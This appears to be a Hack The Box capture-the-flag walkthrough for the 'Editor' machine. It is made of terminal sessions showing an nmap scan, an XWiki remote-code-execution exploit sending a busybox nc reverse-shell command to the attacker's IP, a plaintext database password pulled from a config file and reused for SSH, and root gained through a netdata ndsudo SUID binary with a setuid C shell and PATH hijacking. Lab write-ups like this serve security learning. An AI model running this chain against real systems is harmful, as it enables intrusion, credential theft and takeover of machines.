Before watching tutorials , it is recommended to try it out by yourself first.
-> Let's try different things

## Nmap
nmap  -p- -A --min-rate=1000 -o nmap0.txt 10.10.11.80
Warning: 10.10.11.80 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.80
Host is up (0.10s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp    open     http           nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)

1218/tcp  filtered aeroflight-ads

8080/tcp  open     http           Jetty 10.0.20
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)

35534/tcp filtered unknown
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   106.52 ms 10.10.14.1
2   105.20 ms 10.10.11.80
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 24 08:20:10 2025 -- 1 IP address (1 host up) scanned in 103.89 seconds
____________________________________________________________________________________________________________________________________________________
# From the web we find it's using Xwifi

┌──(kali㉿kali)-[~/HAckthebox/Editor]
└─$ searchsploit  XWiki
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
<redacted>
XWiki Standard 14.10 - Remote Code Execution (RCE)                      | php/webapps/52105.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

[ My metasploit wasn't working properly so I used a Github POC ]
____________________________________________________________________________________________________________________________________________________
https://github.com/gunzf0x/CVE-2025-24893
#Steps

[ Cloning the Script ]
┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools]
└─$ git clone https://github.com/gunzf0x/CVE-2025-24893.git
Cloning into 'CVE-2025-24893'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (7/7), done.
Resolving deltas: 100% (1/1), done.
____________________________________________________________________________________________________________________________________________________
[ Inspecting the files ]                                                                                                                                                                                          >
┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools]
└─$ l
CVE-2025-24893/
                                                                                                                                                                                            >
┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools]
└─$ cd CVE-2025-24893
                                                                                                                                                                                            >
┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools/CVE-2025-24893]
└─$ l
CVE-2025-24893.py  README.md
____________________________________________________________________________________________________________________________________________________
[ Executing the script ]
                                                                                                                                                                                            >
┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools/CVE-2025-24893]
└─$ python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.14.156 8888 -e /bin/bash'
[*] Attacking http://10.10.11.80:8080
[*] Injecting the payload:
http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.156%208888%20-e%20/bin/bash%22.exec>
[*] Command executed

~Happy Hacking
____________________________________________________________________________________________________________________________________________________

[ That gives us a shell ]

┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools/CVE-2025-24893]
└─$ pwncat -l 8888
ls
jetty
logs
start.d
start_xwiki.bat
start_xwiki_debug.bat
start_xwiki_debug.sh
start_xwiki.sh
stop_xwiki.bat
stop_xwiki.sh
webapps

[ We find a user name oliva in the home directory and we find the password ]
____________________________________________________________________________________________________________________________________________________
pwd
/usr/lib/xwiki/WEB-INF

cat hibernate.cfg.xml  |grep password
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
^
[ Now we shh ]
oliver@editor:~
____________________________________________________________________________________________________________________________________________________
# Privilege Escalation

[ We find a unusual SUID ]

$ find / -perm -4000 -type f 2>/dev/null | less

\/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
[ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo ]
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1

[ Going Further we discover that an exploit for this is already available ]
____________________________________________________________________________________________________________________________________________________

# Steps

[ Cloning the repo]
┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools]
└─$ git clone https://github.com/AzureADTrent/CVE-2024-32019-POC.git
Cloning into 'CVE-2024-32019-POC'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 12 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 4.53 KiB | 171.00 KiB/s, done.
Resolving deltas: 100% (1/1), done.
____________________________________________________________________________________________________________________________________________________
[ Inspecting files ]

┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools]
└─$ l
CVE-2024-32019-POC/  CVE-2025-24893/

┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools]
└─$ cd CVE-2024-32019-POC

┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools/CVE-2024-32019-POC]
└─$ l
poc.c  README.md

┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools/CVE-2024-32019-POC]
└─$ cat poc.c
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
____________________________________________________________________________________________________________________________________________________
# Ececuting the payload 

[ We need to locally compile this payload using this command]

┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools/CVE-2024-32019-POC]
└─$ gcc poc.c -o nvme

[ We pass in the user and target ]

┌──(kali㉿kali)-[~/HAckthebox/Editor/Tools/CVE-2024-32019-POC]
└─$ scp nvme oliver@10.10.11.80:/tmp/

oliver@10.10.11.80's password:
nvme                                                                    100%   16KB  66.8KB/s   00:00
____________________________________________________________________________________________________________________________________________________
# on victim machine

[ Commands ]
oliver@editor:~$ chmod +x /tmp/nvme
oliver@editor:~$ export PATH=/tmp:$PATH

[Results]
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/home/oliver# cd /root
root@editor:/root# ls
root.txt  scripts  snap
____________________________________________________________________________________________________________________________________________________
   *** Enjoy ***
